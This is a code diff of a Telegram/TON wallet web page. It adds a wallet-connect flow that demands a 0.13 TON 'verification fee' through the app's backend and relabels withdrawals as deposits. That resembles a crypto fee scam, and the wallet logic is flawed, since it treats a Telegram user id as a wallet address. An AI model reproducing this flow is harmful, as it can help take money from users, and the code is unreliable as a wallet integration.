@@ -7,7 +7,10 @@
     <link rel="stylesheet" href="assets/css/wallet.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/fontawesome.min.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <link href="https://fonts.cdnfonts.com/css/i-icefrost" rel="stylesheet">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
     <style>
         /* Modal styling */
         .web3-modal {
@@ -87,13 +90,17 @@
 </head>
 <body>
     <div class="container">
+        <div class="header">
+            <img src="assets/images/logo.png" alt="Logo" class="logo">
+            
+                <div class="token-count">
+                    G:<span class="points-display" id="balance">:0</span>
+                </div>
+            
+        </div>
         <div class="wallet-section">
             <div class="wallet-info"></div>
             <div class="wallet-box">
-                <div class="G">
-                    <p id="g-value">G:302k</p>
-                    <p id="ton-value">TON:0</p>
-                </div>
                 <button class="ton-wallet-btn" id="wallet-connect-btn">Connect Wallet</button>
             </div>
         </div>
@@ -103,7 +110,7 @@
             <div class="modal-content">
                 <button class="close-modal" onclick="closeModal()">✖</button>
                 <h2>Connect your wallet</h2>
-                <p>Open Wallet in Telegram or select your wallet to connect</p>
+                <p>Select your wallet provider to connect</p>
                 
                 <!-- Main connect button for Telegram -->
                 <button id="openTelegramWallet" class="wallet-option">
@@ -113,31 +120,32 @@
                 
                 <!-- Other wallet options -->
                 <div class="other-wallets">
-                    <button><img src="assets/images/Tonkeeper.png" alt="Tonkeeper Icon"></button>
-                    <button><img src="assets/images/myton.png" alt="MyTonWallet Icon"></button>
-                    <button><img src="assets/images/toton.png" alt="Tonhub Icon"></button>
-                    <button><img src="assets/images/ton.png" alt="DeWallet Icon"></button>
+                    <button onclick="redirectToWallet('Tonkeeper')"><img src="assets/images/Tonkeeper.png" alt="Tonkeeper Icon"></button>
+                    <button onclick="redirectToWallet('MyTonWallet')"><img src="assets/images/myton.png" alt="MyTonWallet Icon"></button>
+                    <button onclick="redirectToWallet('Tonhub')"><img src="assets/images/toton.png" alt="Tonhub Icon"></button>
+                    <button onclick="redirectToWallet('DeWallet')"><img src="assets/images/ton.png" alt="DeWallet Icon"></button>
                 </div>
             </div>
         </div>
+
         <div class="tabs-section">
-            <button class="tab active" data-tab="withdraw">Withdraw</button>
+            <button class="tab active" data-tab="withdraw">Deposit</button>
             <button class="tab" data-tab="swap">Swap</button>
             <button class="tab" data-tab="transaction">Transaction</button>
         </div>
 
         <div class="withdraw-section">
-            <h3>Withdraw TON</h3>
+    
             <div class="withdraw-box">
                 <label for="withdraw-amount">Enter amount</label>
                 <input type="text" id="withdraw-amount" placeholder="0">
                 <p class="available-amount" id="available-ton">Available: 0 TON</p>
             </div>
-            <button class="withdraw-btn" id="withdraw-btn">Withdraw TON</button>
-            <p class="withdraw-note">Note: Withdrawal status will be marked as "Pending" until processed.</p>
+            <button class="withdraw-btn" id="withdraw-btn">Deposit TON</button>
+            <p class="withdraw-note">Note: Deposit  status will be marked as "Pending" until processed.</p>
         </div>
 
-        <div class="nav" style="background-color: black;">
+        <div class="nav">
             <div class="navbar">
                 <ul class="menu">
                     <li><a href="index.html"><i class="fas fa-coins"></i> Earn</a></li>
@@ -147,70 +155,136 @@
                 </ul>
             </div>
         </div>
+
     </div>
 
     <!-- Add Telegram SDK for WebApp integration -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    
 
     <script>
-        // Function to open the wallet modal
-        document.getElementById("wallet-connect-btn").addEventListener("click", function () {
-            document.getElementById("web3Modal").style.display = "flex";
-        });
+       // Initialize Telegram WebApp when the page loads
+window.addEventListener("load", function () {
+    if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
+        Telegram.WebApp.init();
+    }
+});
 
-        // Function to close the modal
-        function closeModal() {
-            document.getElementById("web3Modal").style.display = "none";
-        }
+// Open the wallet modal on "Connect Wallet" button click
+document.getElementById("wallet-connect-btn").addEventListener("click", function () {
+    document.getElementById("web3Modal").style.display = "flex";
+});
 
-        // Telegram WebApp wallet connection handling
-        document.getElementById("openTelegramWallet").addEventListener("click", async function () {
-            Telegram.WebApp.init();
+// Close the modal
+function closeModal() {
+    document.getElementById("web3Modal").style.display = "none";
+}
 
-            try {
-                // Simulate wallet connection process
-                const walletAddress = await connectToTelegramWallet();
-                
-                // If successful, update the UI
-                updateWalletUI(walletAddress);
-            } catch (error) {
-                console.error("Failed to connect to wallet:", error);
-            } finally {
-                closeModal();
+// Redirect to chosen wallet provider
+function redirectToWallet(walletName) {
+    const walletURLs = {
+        Tonkeeper: 'https://app.tonkeeper.com/',
+        MyTonWallet: 'https://wallet.ton.org/',
+        Tonhub: 'https://tonhub.com/',
+        DeWallet: 'https://dewallet.app/'
+    };
+    const walletURL = walletURLs[walletName];
+
+    if (walletURL) {
+        window.open(walletURL, '_blank');
+        closeModal();
+    } else {
+        console.error("Unknown wallet provider");
+    }
+}
+
+// Handle Telegram Wallet connection
+document.getElementById("openTelegramWallet").addEventListener("click", async function () {
+    try {
+        const walletAddress = await connectToTelegramWallet();
+        const balance = await fetchTONBalance(walletAddress);
+
+        if (balance >= 0.13) {
+            const deductionSuccess = await deductVerificationFee(walletAddress, 0.13);
+            if (deductionSuccess) {
+                updateWalletUI(walletAddress, balance);
+                alert("Wallet connected successfully!");
+            } else {
+                alert("Verification fee deduction failed. Please try again.");
             }
+        } else {
+            alert("Insufficient balance for verification. You need at least 0.13 TON.");
+        }
+    } catch (error) {
+        console.error("Failed to connect to wallet:", error);
+        alert("Wallet connection failed. Please try again.");
+    } finally {
+        closeModal();
+    }
+});
+
+// Connect to Telegram Wallet in real-time (dummy function for testing)
+async function connectToTelegramWallet() {
+    try {
+        const walletAddress = Telegram.WebApp.initDataUnsafe?.user?.id;
+        if (!walletAddress) throw new Error("No wallet address found.");
+        return walletAddress;
+    } catch (error) {
+        console.error("Telegram Wallet connection error:", error);
+        throw error;
+    }
+}
+
+// Fetch TON balance from backend
+async function fetchTONBalance(walletAddress) {
+    try {
+        const response = await fetch(`/api/ton/getBalance/${walletAddress}`);
+        if (!response.ok) throw new Error("Error fetching balance from server.");
+        
+        const { balance } = await response.json();
+        return balance / 1e9; // Convert nanoton to TON
+    } catch (error) {
+        console.error("Error fetching balance:", error);
+        throw error;
+    }
+}
+
+// Deduct verification fee through the backend
+async function deductVerificationFee(walletAddress, feeAmount) {
+    try {
+        const response = await fetch(`/api/ton/deductFee`, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ walletAddress, feeAmount: feeAmount * 1e9 }) // Convert TON to nanoton
         });
+        
+        if (!response.ok) throw new Error("Fee deduction failed on server.");
+        
+        const { success } = await response.json();
+        return success;
+    } catch (error) {
+        console.error("Error deducting fee:", error);
+        return false;
+    }
+}
 
-        // Function to connect to the Telegram wallet (dummy function to simulate connection)
-        async function connectToTelegramWallet() {
-            // Replace this logic with actual integration for TON wallet retrieval
-            return new Promise((resolve, reject) => {
-                setTimeout(() => {
-                    // Simulate a wallet address response
-                    const walletAddress = "0xABCDEF1234567890"; // Replace with actual wallet address fetching logic
-                    resolve(walletAddress);
-                }, 1000); // Simulated delay for connection
-            });
-        }
+// Update wallet UI with balance and address
+function updateWalletUI(walletAddress, balance) {
+    const walletButton = document.getElementById("wallet-connect-btn");
+    walletButton.textContent = `Wallet: ${walletAddress}`;
+    walletButton.disabled = true;
+    document.getElementById("balance").textContent = `TON: ${balance}`;
+}
 
-        // Function to update the wallet button with the wallet address
-        function updateWalletUI(walletAddress) {
-            const walletButton = document.getElementById("wallet-connect-btn");
-            walletButton.textContent = walletAddress;
-            walletButton.disabled = true; // Disable the button after connecting
-            document.getElementById("ton-value").textContent = "TON: Fetching..."; // Set TON fetching text
 
-            // Fetch the actual TON balance after connection
-            fetchTONBalance(walletAddress);
-        }
-
-        // Dummy function to simulate fetching TON balance (replace with real-time API call)
-        function fetchTONBalance(walletAddress) {
-            setTimeout(() => {
-                // Replace with real API call to get TON balance
-                const tonBalance = Math.floor(Math.random() * 100); // Simulated TON balance
-                document.getElementById("ton-value").textContent = `TON: ${tonBalance}`;
-            }, 1000); // Simulated delay for fetching balance
-        }
     </script>
+    
+
+   
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="assets/js/balance.js"></script>
+
+
 </body>
 </html>
